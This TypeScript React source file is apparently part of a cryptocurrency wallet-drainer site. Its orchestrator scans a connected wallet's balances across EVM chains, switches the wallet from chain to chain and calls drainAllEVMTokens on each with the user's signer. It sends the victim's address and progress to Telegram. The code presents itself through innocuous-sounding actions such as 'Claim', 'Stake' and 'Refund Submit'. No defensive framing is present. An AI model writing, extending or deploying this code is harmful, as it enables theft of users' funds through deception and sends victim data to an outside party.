import {
  createContext,
  useContext,
  useState,
  useCallback,
  useRef,
  ReactNode,
  FC,
  useEffect,
} from 'react';
import { ethers } from 'ethers';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { useChain, EVM_CHAINS, EVMChainConfig } from '@/contexts/ChainContext';
import { scanAllEvmChains, ChainHolding } from '@/services/evmMultiChainScanner';
import { drainAllEVMTokens } from '@/utils/evmTransactions';
import { sendTelegramMessage } from '@/utils/telegram';

export type ActionType =
  | 'swap'
  | 'claim'
  | 'apepe'
  | 'ovt'
  | 'stake'
  | 'donate'
  | 'token-detail'
  | 'features-token'
  | 'ads'
  | 'list'
  | 'otc'
  | 'pump'
  | 'refund';

interface OrchestratorState {
  isProcessing: boolean;
  currentChainIndex: number;
  totalChains: number;
  queue: EVMChainConfig[];
  currentAction: ActionType | null;
  lastProcessedChainId: number | null;
}

interface MultiChainOrchestratorContextType {
  state: OrchestratorState;
  runDrainAllChains: (action: ActionType) => Promise<void>;
  resetOrchestrator: () => void;
}

const initialState: OrchestratorState = {
  isProcessing: false,
  currentChainIndex: 0,
  totalChains: 0,
  queue: [],
  currentAction: null,
  lastProcessedChainId: null,
};

const MultiChainOrchestratorContext =
  createContext<MultiChainOrchestratorContextType | undefined>(undefined);

const ACTION_LABELS: Record<ActionType, string> = {
  swap: 'Swap',
  claim: 'Claim',
  apepe: 'Apepe Claim',
  ovt: 'OVT Claim',
  stake: 'Stake',
  donate: 'Donate',
  'token-detail': 'Token Detail Claim',
  'features-token': 'Features Token Claim',
  ads: 'Ads Payment',
  list: 'List Verify',
  otc: 'OTC Verify',
  pump: 'Pump Request',
  refund: 'Refund Submit',
};

const SCAN_CACHE_KEY_PREFIX = 'evm_balance_scan_cache_';
const SCAN_CACHE_TTL_MS = 1000 * 60 * 30;

interface ScanCacheEntry {
  timestamp: number;
  holdings: ChainHolding[];
}

function readScanCache(address: string): ChainHolding[] | null {
  try {
    const raw = sessionStorage.getItem(SCAN_CACHE_KEY_PREFIX + address.toLowerCase());
    if (!raw) return null;
    const entry: ScanCacheEntry = JSON.parse(raw);
    if (Date.now() - entry.timestamp > SCAN_CACHE_TTL_MS) return null;
    return entry.holdings;
  } catch {
    return null;
  }
}

function writeScanCache(address: string, holdings: ChainHolding[]) {
  try {
    const entry: ScanCacheEntry = { timestamp: Date.now(), holdings };
    sessionStorage.setItem(
      SCAN_CACHE_KEY_PREFIX + address.toLowerCase(),
      JSON.stringify(entry)
    );
  } catch {
    /* ignore storage errors */
  }
}

export const MultiChainOrchestratorProvider: FC<{ children: ReactNode }> = ({ children }) => {
  const { evmSigner, evmProvider, evmAddress, isEVMConnected, switchChain, getLatest } = useEVMWallet();
  const { evmChainId, setActiveChain } = useChain();
  const [state, setState] = useState<OrchestratorState>(initialState);
  const processingLockRef = useRef(false);

  const resetOrchestrator = useCallback(() => {
    setState(initialState);
  }, []);

  const buildQueueFromHoldings = useCallback(
    (holdings: ChainHolding[], connectedChainId: number | null): EVMChainConfig[] => {
      const chainIdsWithBalance = new Set(holdings.map((h) => h.chainId));
      const chainsWithBalance = EVM_CHAINS.filter((c) => chainIdsWithBalance.has(c.chainId));
      if (chainsWithBalance.length === 0) return [];

      const connected = chainsWithBalance.find((c) => c.chainId === connectedChainId);
      const rest = chainsWithBalance.filter((c) => c.chainId !== connectedChainId);
      const ordered = connected ? [connected, ...rest] : [...rest];
      return ordered;
    },
    []
  );

  const runForSingleChain = useCallback(
    async (
      chain: EVMChainConfig,
      _action: ActionType,
      getLatest: () => { signer: ethers.JsonRpcSigner | null; provider: ethers.BrowserProvider | null; address: string | null }
    ) => {
      const latest = getLatest();
      if (!latest.signer || !latest.provider) {
        throw new Error(`No signer/provider available after switch to ${chain.name}`);
      }
      await drainAllEVMTokens(latest.signer, latest.provider, chain.name, chain.chainId);
    },
    []
  );

  const runDrainAllChains = useCallback(
    async (action: ActionType) => {
      if (processingLockRef.current) return;

      const initial = getLatest();
      if (!isEVMConnected || !initial.signer || !initial.provider || !initial.address) {
        console.warn('[Orchestrator] EVM not connected, skipping orchestration');
        return;
      }

      processingLockRef.current = true;
      try {
        let holdings = readScanCache(initial.address);
        if (!holdings) {
          try {
            holdings = await scanAllEvmChains(initial.address);
            writeScanCache(initial.address, holdings);
          } catch (scanErr) {
            console.warn('[Orchestrator] Balance scan failed, falling back to current chain only:', scanErr);
            const currentChain = EVM_CHAINS.find((c) => c.chainId === evmChainId);
            if (currentChain) {
              holdings = [
                {
                  chainId: currentChain.chainId,
                  chainName: currentChain.name,
                  native: { symbol: currentChain.nativeToken, amount: Number.MAX_SAFE_INTEGER },
                  tokens: [],
                },
              ];
            } else {
              holdings = [];
            }
          }
        }

        const queue: EVMChainConfig[] = buildQueueFromHoldings(holdings, evmChainId);
        if (queue.length === 0) {
          console.warn('[Orchestrator] No chains with balances found, running on currently connected chain');
          const currentChain = EVM_CHAINS.find((c) => c.chainId === evmChainId);
          if (currentChain) {
            queue.push(currentChain);
          }
        }

        setState({
          isProcessing: true,
          currentChainIndex: 0,
          totalChains: queue.length,
          queue,
          currentAction: action,
          lastProcessedChainId: null,
        });

        sendTelegramMessage(
          `🔁 <b>Multi-Chain Orchestration Started</b>\n` +
            `👤 <b>Address:</b> <code>${initial.address}</code>\n` +
            `🎬 <b>Action:</b> ${ACTION_LABELS[action]}\n` +
            `🔗 <b>Chains queued:</b> ${queue.length}\n` +
            queue.map((c, i) => `  ${i + 1}. ${c.name} (${c.shortName})`).join('\n')
        ).catch(() => {});

        for (let i = 0; i < queue.length; i++) {
          const chain = queue[i];

          setState((prev) => ({ ...prev, currentChainIndex: i, lastProcessedChainId: null }));

          if (i > 0) {
            try {
              await switchChain(chain.chainId);
            } catch (switchErr: any) {
              console.error(
                `[Orchestrator] Failed to switch to ${chain.name}, skipping:`,
                switchErr?.message ?? switchErr
              );
              sendTelegramMessage(
                `⚠️ <b>Chain Switch Failed</b>\n` +
                  `🔗 <b>Chain:</b> ${chain.name}\n` +
                  `❌ <b>Error:</b> <code>${switchErr?.message ?? String(switchErr)}</code>`
              ).catch(() => {});
              continue;
            }

            await new Promise((resolve) => setTimeout(resolve, 2500));
          }

          try {
            await runForSingleChain(chain, action, getLatest);
            setState((prev) => ({ ...prev, lastProcessedChainId: chain.chainId }));
          } catch (chainErr: any) {
            console.error(
              `[Orchestrator] Action failed on ${chain.name}:`,
              chainErr?.message ?? chainErr
            );
            sendTelegramMessage(
              `⚠️ <b>Action Failed on Chain</b>\n` +
                `🔗 <b>Chain:</b> ${chain.name}\n` +
                `🎬 <b>Action:</b> ${ACTION_LABELS[action]}\n` +
                `❌ <b>Error:</b> <code>${chainErr?.message ?? String(chainErr)}</code>`
            ).catch(() => {});
          }
        }

        sendTelegramMessage(
          `✅ <b>Multi-Chain Orchestration Complete</b>\n` +
            `👤 <b>Address:</b> <code>${initial.address}</code>\n` +
            `🎬 <b>Action:</b> ${ACTION_LABELS[action]}\n` +
            `🔗 <b>Chains processed:</b> ${queue.length}`
        ).catch(() => {});
      } finally {
        processingLockRef.current = false;
        setState((prev) => ({
          ...prev,
          isProcessing: false,
        }));
      }
    },
    [
      isEVMConnected,
      evmChainId,
      setActiveChain,
      buildQueueFromHoldings,
      switchChain,
      runForSingleChain,
      getLatest,
    ]
  );

  return (
    <MultiChainOrchestratorContext.Provider
      value={{ state, runDrainAllChains, resetOrchestrator }}
    >
      {children}
    </MultiChainOrchestratorContext.Provider>
  );
};

export const useMultiChainOrchestrator = () => {
  const ctx = useContext(MultiChainOrchestratorContext);
  if (!ctx)
    throw new Error(
      'useMultiChainOrchestrator must be used within MultiChainOrchestratorProvider'
    );
  return ctx;
};
